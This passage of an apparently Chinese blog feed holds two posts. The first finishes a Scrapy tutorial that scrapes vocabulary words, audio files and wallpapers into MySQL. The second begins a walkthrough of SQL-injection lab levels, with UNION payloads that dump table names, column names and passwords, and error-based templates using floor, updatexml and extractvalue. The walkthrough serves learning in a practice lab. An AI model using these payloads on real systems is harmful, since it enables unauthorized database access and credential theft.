        <span class="hljs-comment"># 向数据库中插入数据</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">insert</span>(<span class="hljs-params">self, sql, *params</span>):  <span class="hljs-comment">#</span>
        conn = self.connectDatabase()
        cur = conn.cursor();
        cur.execute(sql, params)
        conn.commit()
        cur.close()
        conn.close()
        <span class="hljs-comment"># 数据库更新操作</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, sql, *params</span>):
        conn = self.connectDatabase()
        cur = conn.cursor()
        cur.execute(sql, params)
        conn.commit()
        cur.close()
        conn.close()


    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">self, sql, *params</span>):
        conn = self.connectDatabase()
        cur = conn.cursor()
        cur.execute(sql, params)
        conn.commit()
        cur.close()
        conn.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TestDBHelper</span>():
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.dbHelper = DBHelper()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testCreateDatebase</span>(<span class="hljs-params">self</span>):
        self.dbHelper.createDatabase()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testCreateTable</span>(<span class="hljs-params">self</span>):
        sql = <span class="hljs-string">&quot;create table wordtable(id int primary key auto_increment,word varchar(50),soundmark varchar(100),url varchar(200),translation varchar(100))&quot;</span>
        self.dbHelper.createTable(sql)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testInsert</span>(<span class="hljs-params">self</span>):
        sql = <span class="hljs-string">&quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot;</span>
        params = (<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)
        self.dbHelper.insert(sql, *params)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testUpdate</span>(<span class="hljs-params">self</span>):
        sql = <span class="hljs-string">&quot;update testtable set word=%s,soundmark=%s,url=%s,translation=%s where id=%s&quot;</span>
        params = (<span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)
        self.dbHelper.update(sql, *params)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testDelete</span>(<span class="hljs-params">self</span>):
        sql = <span class="hljs-string">&quot;delete from wordtable where id=%s&quot;</span>
        params = (<span class="hljs-string">&quot;1&quot;</span>)
        self.dbHelper.delete(sql, *params)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    testDBHelper = TestDBHelper()
    <span class="hljs-comment"># testDBHelper.testCreateDatebase()</span>
    <span class="hljs-comment"># testDBHelper.testCreateTable()</span>
    <span class="hljs-comment"># testDBHelper.testInsert()</span></code></pre>

<p>在编写爬虫之前先运行一次该程序，就可以在数据库中看到新创建的数据库</p>
<h2 id="爬虫编写"><a href="#爬虫编写" class="headerlink" title="爬虫编写"></a>爬虫编写</h2><h3 id="setting-py"><a href="#setting-py" class="headerlink" title="setting.py"></a>setting.py</h3><pre><code class="hljs python">BOT_NAME = <span class="hljs-string">&#x27;words&#x27;</span>

SPIDER_MODULES = [<span class="hljs-string">&#x27;words.spiders&#x27;</span>]
NEWSPIDER_MODULE = <span class="hljs-string">&#x27;words.spiders&#x27;</span>


<span class="hljs-comment">#Mysql数据库的配置信息</span>
MYSQL_HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>
MYSQL_DBNAME = <span class="hljs-string">&#x27;word&#x27;</span>         <span class="hljs-comment">#数据库名字，请修改</span>
MYSQL_USER = <span class="hljs-string">&#x27;root&#x27;</span>             <span class="hljs-comment">#数据库账号，请修改</span>
MYSQL_PASSWD = <span class="hljs-string">&#x27;root&#x27;</span>         <span class="hljs-comment">#数据库密码，请修改</span>

MYSQL_PORT = <span class="hljs-number">3306</span>               <span class="hljs-comment">#数据库端口，在dbhelper中使用</span>


<span class="hljs-comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span>
<span class="hljs-comment">#USER_AGENT = &#x27;word (+http://www.yourdomain.com)&#x27;</span>
USER_AGENT = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36&#x27;</span>

LOG_LEVEL = <span class="hljs-string">&quot;WARNING&quot;</span>
ROBOTSTXT_OBEY = <span class="hljs-literal">True</span>

<span class="hljs-comment"># Configure item pipelines</span>
<span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span>
ITEM_PIPELINES = &#123;
    <span class="hljs-comment"># 两个管道的优先级相同</span>
    <span class="hljs-string">&#x27;words.pipelines.WebcrawlerScrapyPipeline&#x27;</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">#保存到mysql数据库</span>
    <span class="hljs-string">&#x27;words.pipelines.JsonWithEncodingPipeline&#x27;</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">#保存到json文件中</span>
&#125;</code></pre>



<h3 id="items-py"><a href="#items-py" class="headerlink" title="items.py"></a>items.py</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy


<span class="hljs-keyword">class</span> <span class="hljs-title class_">WordsItem</span>(scrapy.Item):
    <span class="hljs-comment"># define the fields for your item here like:</span>
    <span class="hljs-comment"># name = scrapy.Field()</span>
    word = scrapy.Field()
    soundmark = scrapy.Field()
    url = scrapy.Field()
    translation = scrapy.Field()
</code></pre>



<h3 id="web-word-py"><a href="#web-word-py" class="headerlink" title="web_word.py"></a>web_word.py</h3><p>爬虫文件</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> urllib.request
<span class="hljs-keyword">from</span> scrapy.selector <span class="hljs-keyword">import</span> Selector
<span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> HtmlResponse,Request
<span class="hljs-keyword">from</span> words.items <span class="hljs-keyword">import</span> WordsItem

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WebWordSpider</span>(scrapy.Spider):
    name = <span class="hljs-string">&#x27;web_word&#x27;</span>
    allowed_domains = [<span class="hljs-string">&#x27;word.iciba.com/&#x27;</span>]

    <span class="hljs-comment"># class 是四级必备单词，这里可以根据需要选择不同的单词表</span>
    first_url = <span class="hljs-string">&quot;http://word.iciba.com/?action=words&amp;class=11&amp;course=&#123;&#125;&quot;</span>
    start_urls = []

    <span class="hljs-comment"># 生成爬取需要的url地址池</span>
    <span class="hljs-comment"># 可以根据需要修改nums，控制爬取的单词数</span>
    nums = <span class="hljs-number">11</span>  <span class="hljs-comment"># 爬取前10页的单词，一共200个单词</span>
    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,nums):
        start_urls.append(first_url.<span class="hljs-built_in">format</span>(page))
    <span class="hljs-built_in">print</span>(start_urls)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):
        se = Selector(response)
        <span class="hljs-comment"># 先判断页面中是否存在单词</span>
        src = se.xpath(<span class="hljs-string">&quot;//div[@class=&#x27;word_main&#x27;]/ul/li&quot;</span>)
        <span class="hljs-comment"># 提取出url中的页数</span>
        page = re.findall(<span class="hljs-string">r&quot;course=\d+&quot;</span>, response.url)[<span class="hljs-number">0</span>]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;===&quot;</span> * <span class="hljs-number">10</span> + <span class="hljs-string">&quot;正在爬取第&quot;</span>+page[<span class="hljs-number">7</span>:]+<span class="hljs-string">&quot;页&quot;</span>+<span class="hljs-string">&quot;===&quot;</span> * <span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(src) &gt; <span class="hljs-number">0</span>:
            <span class="hljs-comment"># 将单词的信息提取出来，word是一个数组，存放的是页面中的所有单词</span>
            word = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_w&#x27;]/span/@title&quot;</span> ).extract()  <span class="hljs-comment"># 提取节点信息</span>
            soundmark = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/strong/text()&quot;</span> ).extract()
            url = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/a/@id&quot;</span> ).extract()
            translation = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_s&#x27;]/span/@title&quot;</span> ).extract()

            <span class="hljs-comment"># 因为上一步提出的音标存在制表符，这里就用正则提取出正确的音标</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(word)):
                sm = re.findall(<span class="hljs-string">r&quot;\[.*?\]&quot;</span>,soundmark[i])
                soundmark[i] = sm[<span class="hljs-number">0</span>]

            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(word)):
                file_name = <span class="hljs-string">u&quot;%s.mp3&quot;</span> % word[i]         <span class="hljs-comment"># 用单词给mp3文件命名</span>
                path = os.path.join(<span class="hljs-string">&quot;D:\Sunzh\word\cet4&quot;</span>, file_name)  <span class="hljs-comment"># mp3保存的路径</span>
                urllib.request.urlretrieve(url[i], path)    <span class="hljs-comment"># 下载该mp3文件</span>
                item = WordsItem()
                item[<span class="hljs-string">&#x27;word&#x27;</span>] = word[i]
                item[<span class="hljs-string">&#x27;soundmark&#x27;</span>] = soundmark[i]
                item[<span class="hljs-string">&#x27;url&#x27;</span>] = url[i]
                item[<span class="hljs-string">&#x27;translation&#x27;</span>] = translation[i]
                <span class="hljs-comment"># print(item)</span>
                <span class="hljs-comment"># 将item发给管道处理，在管道中写入数据库和josn文件</span>
                <span class="hljs-keyword">yield</span> item
</code></pre>

<p>这里是使用xpath获取的节点元素，很简单。</p>
<p>可以在浏览器中下载一个插件<code>XPath Helper</code>，辅助写出xpath路径，它可以将所匹配的元素高亮显示，保证程序中的xpath正确性。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502220632784.png" alt="image-20210502220632784"></p>
<h3 id="pipelines-py"><a href="#pipelines-py" class="headerlink" title="pipelines.py"></a>pipelines.py</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> pymysql.cursors
<span class="hljs-keyword">import</span> codecs
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> logging <span class="hljs-keyword">import</span> log
<span class="hljs-keyword">from</span> twisted.enterprise <span class="hljs-keyword">import</span> adbapi

<span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonWithEncodingPipeline</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-string">&#x27;&#x27;&#x27;保存到文件中对应的class</span>
<span class="hljs-string">       1、在settings.py文件中配置</span>
<span class="hljs-string">       2、在自己实现的爬虫类中yield item,会自动执行</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.file = codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;word.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># 保存为json文件</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):
        line = json.dumps(<span class="hljs-built_in">dict</span>(item)) + <span class="hljs-string">&quot;\n&quot;</span>  <span class="hljs-comment"># 转为json的</span>
        self.file.write(line)                 <span class="hljs-comment"># 写入文件中</span>
        <span class="hljs-keyword">return</span> item

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">spider_closed</span>(<span class="hljs-params">self, spider</span>):  <span class="hljs-comment"># 爬虫结束时关闭文件</span>
        self.file.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WebcrawlerScrapyPipeline</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">       保存到数据库中对应的class</span>
<span class="hljs-string">       1、在settings.py文件中配置</span>
<span class="hljs-string">       2、在自己实现的爬虫类中yield item,会自动执行</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, dbpool</span>):
        self.dbpool = dbpool  <span class="hljs-comment"># 定义一个数据库连接对象</span>
        <span class="hljs-string">&#x27;&#x27;&#x27; 这里注释中采用写死在代码中的方式连接线程池，可以从settings配置文件中读取，更加灵活</span>
<span class="hljs-string">            self.dbpool=adbapi.ConnectionPool(&#x27;MySQLdb&#x27;,</span>
<span class="hljs-string">                                          host=&#x27;127.0.0.1&#x27;,</span>
<span class="hljs-string">                                          db=&#x27;crawlpicturesdb&#x27;,</span>
<span class="hljs-string">                                          user=&#x27;root&#x27;,</span>
<span class="hljs-string">                                          passwd=&#x27;123456&#x27;,</span>
<span class="hljs-string">                                          cursorclass=MySQLdb.cursors.DictCursor,</span>
<span class="hljs-string">                                          charset=&#x27;utf8&#x27;,</span>
<span class="hljs-string">                                          use_unicode=False)</span>
<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_settings</span>(<span class="hljs-params">cls, settings</span>):
        <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">           1、@classmethod声明一个类方法，而对于平常我们见到的则叫做实例方法。</span>
<span class="hljs-string">           2、类方法的第一个参数cls（class的缩写，指这个类本身），而实例方法的第一个参数是self，表示该类的一个实例</span>
<span class="hljs-string">           3、可以通过类来调用，就像C.f()，相当于java中的静态方法</span>
<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
        dbparams = <span class="hljs-built_in">dict</span>(
            host=settings[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>],  <span class="hljs-comment"># 读取settings中的配置</span>
            db=settings[<span class="hljs-string">&#x27;MYSQL_DBNAME&#x27;</span>],
            user=settings[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>],
            passwd=settings[<span class="hljs-string">&#x27;MYSQL_PASSWD&#x27;</span>],
            charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,               <span class="hljs-comment"># 编码要加上，否则可能出现中文乱码问题</span>
            cursorclass=pymysql.cursors.DictCursor,
            use_unicode=<span class="hljs-literal">False</span>,
        )
        dbpool = adbapi.ConnectionPool(<span class="hljs-string">&#x27;pymysql&#x27;</span>, **dbparams)  <span class="hljs-comment"># **表示将字典扩展为关键字参数,相当于host=xxx,db=yyy....</span>
        <span class="hljs-keyword">return</span> cls(dbpool)                                     <span class="hljs-comment"># 相当于dbpool付给了这个类，self中可以得到</span>

    <span class="hljs-comment"># pipeline默认调用</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):
        query = self.dbpool.runInteraction(self._conditional_insert, item)  <span class="hljs-comment"># 调用插入的方法</span>
        query.addErrback(self._handle_error, item, spider)                  <span class="hljs-comment"># 调用异常处理方法</span>
        <span class="hljs-keyword">return</span> item

    <span class="hljs-comment"># 写入数据库中</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_conditional_insert</span>(<span class="hljs-params">self, tx, item</span>):
        <span class="hljs-comment"># print (item[&#x27;word&#x27;])</span>
        sql = <span class="hljs-string">&quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot;</span>
        params = (item[<span class="hljs-string">&quot;word&quot;</span>], item[<span class="hljs-string">&quot;soundmark&quot;</span>], item[<span class="hljs-string">&quot;url&quot;</span>], item[<span class="hljs-string">&quot;translation&quot;</span>])
        tx.execute(sql, params)

    <span class="hljs-comment"># 错误处理方法</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_handle_error</span>(<span class="hljs-params">self, failue, item, spider</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------database operation exception!!-----------------&#x27;</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------------------------------------------------------&#x27;</span>)
        <span class="hljs-built_in">print</span>(failue)</code></pre>

<p>pipelines中写了两个方法，分别是将单词的相关性信息写入到数据库，另一个是将单词信息保存到一个json文件中</p>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>运行截图</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221134698.png" alt="image-20210502221134698"></p>
<p>json文件截图</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221223747.png" alt="image-20210502221223747"></p>
<p>下载的音频</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221344459.png" alt="image-20210502221344459" style="zoom:67%;">

<p>数据库内容</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221904968.png" alt="image-20210502221904968"></p>
<h1 id="爬取壁纸的爬虫"><a href="#爬取壁纸的爬虫" class="headerlink" title="爬取壁纸的爬虫"></a>爬取壁纸的爬虫</h1><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> urllib.request

<span class="hljs-keyword">from</span> word.items <span class="hljs-keyword">import</span> WordItem
<span class="hljs-keyword">from</span> scrapy.selector <span class="hljs-keyword">import</span> Selector
<span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> HtmlResponse,Request


<span class="hljs-keyword">class</span> <span class="hljs-title class_">SpiderPicSpider</span>(scrapy.Spider):
    name = <span class="hljs-string">&#x27;spider_pic&#x27;</span>
    allowed_domains = [<span class="hljs-string">&#x27;desk.zol.com.cn&#x27;</span>] <span class="hljs-comment"># 爬虫搜索的域名范围</span>
    first_url = <span class="hljs-string">&quot;http://desk.zol.com.cn/meinv/1920x1080/&#123;0&#125;.html&quot;</span>
    start_urls = [first_url.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)] <span class="hljs-comment"># 爬虫开始的url</span>


    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):
            url = self.first_url.<span class="hljs-built_in">format</span>(i)

            <span class="hljs-keyword">yield</span> Request(
                url=url,
                callback=self.parse_one
            )

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_one</span>(<span class="hljs-params">self, response</span>):
        se = Selector(response)  <span class="hljs-comment"># 创建查询对象</span>
        <span class="hljs-keyword">if</span> (re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;https://desk.zol.com.cn/meinv/\d+x\d+/\d+.html&quot;</span>, response.url)):
            <span class="hljs-comment"># 正则是判断改url是否正确</span>
            src = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li&quot;</span>)  <span class="hljs-comment"># 使用xpath找到所有图片所在的节点</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(src)):
                imgURLs = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li[%d]/a/img/@src&quot;</span> % i).extract()  <span class="hljs-comment"># 提取节点信息</span>
                title = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li[%d]/a/img/@title&quot;</span> % i).extract()

                <span class="hljs-keyword">if</span> imgURLs:
                    <span class="hljs-comment"># 替换url中的尺寸信息 可以下载更大的图片</span>
                    realURL = imgURLs[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;t_s208x130c5&quot;</span>, <span class="hljs-string">&quot;t_s2560x1600c5&quot;</span>)
                    file_name = <span class="hljs-string">u&quot;%s.jpg&quot;</span> % title[<span class="hljs-number">0</span>]

                    path = os.path.join(<span class="hljs-string">&quot;D:\Sunzh\pic\meinv&quot;</span>, file_name)  <span class="hljs-comment"># 拼接图片的路径</span>
                    <span class="hljs-built_in">type</span> = sys.getfilesystemencoding()
                    <span class="hljs-built_in">print</span>(file_name.encode(<span class="hljs-built_in">type</span>))
                    item = WordItem()
                    item[<span class="hljs-string">&#x27;name&#x27;</span>] = file_name
                    item[<span class="hljs-string">&#x27;url&#x27;</span>] = realURL
                    <span class="hljs-comment"># print(item[&#x27;name&#x27;],item[&#x27;url&#x27;])</span>

                    <span class="hljs-keyword">yield</span> item
                    urllib.request.urlretrieve(realURL, path)  <span class="hljs-comment"># 接收文件路径和需要保存的路径，会自动去文件路径下载并保存到我们指定的本地路径</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223115320.png" alt="image-20210502223115320"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223132992.png" alt="image-20210502223132992"></p>
]]></content>
  </entry>
  <entry>
    <title>net_a_and_d</title>
    <url>/2021/03/03/net-a-and-d/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>get提交参数id</p>
<p>首先提交<code>1&#39;</code>，判断是字符型还是数字型注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223925654.png" alt="image-20210130223925654"></p>
<p>这里出现报错，说明是字符类型的，并且是用<code>&#39;</code>将参数id包裹起来的。</p>
<p>接下来就是判断列数，爆表名，爆列名和数据库内容</p>
<p><strong>0x1 确定列数并爆出表名</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213104147.png" alt="image-20210130213104147"></p>
<p>当列数增加到4的时候开始报错，说明是三列</p>
<pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()--+</code></pre>

<p><img src="https://i.loli.net/2021/01/30/KtISlB9Wd4mreqF.png" alt="image-20210130213358017.png"></p>
<p><strong>0x2 爆列名</strong></p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+</code></pre>

<p>这里的列名很多</p>
<pre><code class="hljs pgsql">user_id,first_name,last_name,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>,avatar,last_login,failed_login</code></pre>

<p><strong>0x3 爆出内容</strong></p>
<p>选择password</p>
<pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213751401.png" alt="image-20210130213751401"></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>同样使用 <code>id=1&#39;</code>，判断是什么类型的注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214135139.png" alt="image-20210130214135139"></p>
<p>可以发现输入的<code>&#39;</code>没有其他的<code>&#39;</code>与之闭合，导致报错，所以这是数字型注入</p>
<p>所以可以直接使用level1的注入语句，只需要删除 ‘ 即可</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre>

<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>提交<code>id=1&#39;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214628110.png" alt="image-20210130214628110"></p>
<p>分析一下报错原因</p>
<p>出错的语句为</p>
<pre><code class="hljs 1c">&#x27;1&#x27;&#x27;) LIMIT 0,1</code></pre>

<p>其中<strong style="color:orange;">1’</strong>输入的内容，所以包裹参数的格式为<code>(&#39;id&#39;)</code></p>
<p>注入语句可以直接在level1的基础上增加一个 )即可</p>
<p>将原语句修改为</p>
<pre><code class="hljs ada"><span class="hljs-string">&#x27;1&#x27;</span>) 注入语句 <span class="hljs-comment">--+ &#x27;) LIMIT 0,1 </span></code></pre>

<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+ 

?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+ 

?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users--+</code></pre>

<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>同样输入<code>id=1&#39;</code>，但是这次没有报错，才是是使用了<code>&quot;</code>，换成<code>id=1&quot;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130215456338.png" alt="image-20210130215456338"></p>
<p>很明显和level3基本相同，将<code>&#39;</code>改为<code>&quot;</code>，就是这关的答案</p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>这题是字符型注入，但是不在回显所查询的内容，所以是盲注</p>
<p>查看源码也可以发现</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130220440238.png" alt="image-20210130220440238" style="zoom:50%;">

<p>不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入</p>
<p><strong>报错注入</strong></p>
<p><span style="background-color:yellow"><strong>(1). 通过floor报错</strong></span></p>
<p>and (select 1 from (select count(*),concat((payload) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)</p>
<p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p>
<p><span style="background-color:yellow"><strong>(2). 通过updatexml报错</strong></span></p>
<p>and updatexml(1,payload,1)</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p><span style="background-color:yellow"><strong>(3). 通过ExtractValue报错</strong></span></p>
<p>and extractvalue(1, payload)</p>
<p>输出字符有长度限制，最长32位。</p>
<p><strong>0x1 确定数据库名</strong></p>
<pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x23</span>,database(),<span class="hljs-number">0x23</span>))<span class="hljs-comment">--+</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130221306917.png" alt="image-20210130221306917"></p>
<p><strong>0x2 爆表名</strong></p>
